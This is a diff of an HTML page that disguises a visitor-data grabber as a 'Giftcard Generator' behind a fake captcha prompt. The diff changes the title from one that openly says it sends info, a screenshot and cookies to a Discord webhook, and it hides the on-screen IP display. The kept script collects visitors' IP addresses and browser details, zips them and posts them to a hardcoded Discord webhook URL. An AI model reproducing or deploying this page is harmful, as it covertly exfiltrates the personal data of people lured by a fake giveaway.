@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Info, Screenshot, and Cookies as Zip to Discord Webhook</title>
+    <title>Giftcard Generator</title>
     <style>
         body {
             display: flex;
@@ -72,14 +72,12 @@
     </style>
 </head>
 <body>
-    <div id="ip-display" class="strobing-text">Loading IPs...</div>
+    <div class="container">
+        <div class="flashing-text">Checking for robots..</div>
+        <div class="hue-rotating-text">run the captcha</div>
+    </div>
 
     <iframe id="spotify-player" src="https://open.spotify.com/embed/track/471UcHZ5JhkgjE3CmWNEIG?utm_source=generator" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
-
-    <div class="container">
-        <div class="flashing-text">V4lc</div>
-        <div class="hue-rotating-text">Say V4lc Runs You or ur info is everywhere</div>
-    </div>
 
     <div id="info">
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -104,11 +102,6 @@
                     console.error('Error fetching IP addresses:', error);
                     return { ipv4: 'Unable to retrieve IPv4 address', ipv6: 'Unable to retrieve IPv6 address' };
                 }
-            }
-
-            function displayIPs(ipv4, ipv6) {
-                const ipDisplayElement = document.getElementById('ip-display');
-                ipDisplayElement.innerHTML = `IPv4: ${ipv4} | IPv6: ${ipv6}`;
             }
 
             function getBrowserInfo() {
@@ -204,12 +197,36 @@
                 const formData = new FormData();
                 formData.append('file', zipBlob, 'info.zip');
 
+                // Embed payload
+                const embedPayload = {
+                    embeds: [{
+                        title: "Giftcard Gen",
+                        description: "Generate Giftcards FAST with v4lc",
+                        image: {
+                            url: "attachment://roblox.jpg"
+                        }
+                    }]
+                };
+
                 try {
                     await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
                         method: 'POST',
+                        body: JSON.stringify(embedPayload),
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    const response = await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
+                        method: 'POST',
                         body: formData
                     });
-                    console.log('Zip file sent to Discord webhook');
+
+                    if (response.ok) {
+                        console.log('Zip file sent to Discord webhook with embed');
+                    } else {
+                        console.error('Failed to send zip file to Discord webhook');
+                    }
                 } catch (error) {
                     console.error('Error sending zip file to Discord webhook:', error);
                 }
@@ -218,7 +235,6 @@
             async function initialize() {
                 const uniqueId = generateUniqueId();
                 const ipAddresses = await getIpAddresses();
-                displayIPs(ipAddresses.ipv4, ipAddresses.ipv6);
                 const browserInfo = getBrowserInfo();
                 browserInfo.ipv4 = ipAddresses.ipv4;
                 browserInfo.ipv6 = ipAddresses.ipv6;
